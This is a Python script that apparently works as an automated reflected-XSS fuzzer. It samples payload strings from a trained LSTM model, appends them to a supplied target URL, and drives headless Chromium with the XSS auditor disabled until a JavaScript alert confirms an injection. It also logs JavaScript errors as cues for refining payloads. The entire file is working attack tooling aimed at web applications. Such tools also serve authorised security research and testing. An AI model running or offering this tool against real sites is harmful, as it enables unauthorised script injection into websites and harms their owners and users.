import sys

if len(sys.argv) != 5:
  print("Usage: {} <url> <model.h5> <payload size: 10 -> Infinity> <Temperature: 0 -> Infinity>".format(sys.argv[0]))
  sys.exit(1) 

base = sys.argv[1]
model_weights = sys.argv[2]
payload_size = int(sys.argv[3])
temperature = float(sys.argv[4])

with open("data.txt", "r") as f:
  lines = f.readlines()
text = "".join([item for sublist in lines for item in sublist])
chars = sorted(list(set(text)))
char_indices = dict([(c, i) for i, c in enumerate(chars)])
indices_char = dict([(i, c) for i, c in enumerate(chars)])
print('payloads: {} corpus length: {}  total chars: {}'.format(len(lines), len(text), len(chars)))


from selenium import webdriver
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from selenium.webdriver.support.ui import WebDriverWait
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support import expected_conditions as EC
import time
from termcolor import colored
import urllib.parse
import json

import numpy as np
from keras.models import model_from_json
with open("lstm_model.json", "r") as json_file:
  model = model_from_json(json_file.read())
model.summary()
model.load_weights(model_weights)
 

# Sampler to generate character sequence
import random
def sample1(preds, temperature=1.0):
  preds = np.asarray(preds).astype('float64')
  preds = np.log(preds) / temperature
  exp_preds = np.exp(preds)
  preds = exp_preds / np.sum(exp_preds)
  probas = np.random.multinomial(1, preds, 1)
  return np.argmax(probas)

def sample2(a, temperature=1.0):
  # helper function to sample an index from a probability array
  a = np.log(a) / temperature
  a = np.exp(a) / np.sum(np.exp(a))
  return np.argmax(np.random.multinomial(1, a, 1))

# Generate payload
# temperature in [0.2, 0.5, 1.0]:
# A temperature 
#  - less than 1 will tend toward a more strict attempt to recreate the original text, whereas a temp 
#  - greater than 1 will produce a more diverse outcome, but as the distribution flattens the learned patterns begin to wash away and you tend back toward nonsense. Higher diversities are fun to play with though.
def generate(payload_size, temperature):
  MAX_LENGTH_PAYLOAD = 50
  print('----- temperature:', temperature)
  # start_index = random.randint(0, len(text) - maxlen - 1)
  # sentence = text[start_index: start_index + maxlen]
  # Take the first two characters of a payload
  start_index = random.randint(0, len(lines))
  sentence = lines[start_index][0:MAX_LENGTH_PAYLOAD]
  # generated = sentence
  generated = ''
  print('----- Generating with seed: "' + sentence + '"')
  for i in range(payload_size):
      # One-hot encoding of the sentence
      # Wor2Vec
      x = np.zeros((1, MAX_LENGTH_PAYLOAD, len(chars)))
      for t, char in enumerate(sentence):
          x[0, t, char_indices[char]] = 1.
      
      preds = model.predict(x, verbose=0)[0]
      # next_index = np.argmax(preds)
      next_index = sample1(preds, temperature)
      next_char = indices_char[next_index]
      generated += next_char
      # Shift by one char to predict the Nth character
      sentence = sentence[1:] + next_char
  print("Payload : " + generated)
  return generated 

options = webdriver.ChromeOptions()
options.add_argument("--disable-xss-auditor")
options.add_argument('--headless')
options.binary_location = "/usr/bin/chromium-browser"

d = DesiredCapabilities.CHROME.copy()
d['loggingPrefs'] = { 'browser':'ALL' }
browser = webdriver.Chrome(options = options, desired_capabilities=d) 
# options = webdriver.FirefoxOptions()
# options.add_argument('-headless')
# browser = webdriver.Firefox(firefox_options=options)

success = False
while not success:
  try:
    url = base  + urllib.parse.quote(generate(payload_size, temperature))
    browser.get(url)
    WebDriverWait(browser, 2).until(EC.alert_is_present(), 'Timeout!')
    alert = browser.switch_to.alert
    alert.accept()
    success = True
    print(colored("OK! " + url, "green"))
  except TimeoutException:
    print(colored("Failure " + url, "red"))
    for log in browser.get_log('browser'):
        print(log)
        if log['source'] == 'javascript':
            print(colored("We got a javscript error! Refining the payload can lead to an XSS!", "cyan"))
            print(colored(log, "cyan"))
    browser.save_screenshot('fail_{}.png'.format(time.time()))
 
browser.quit()
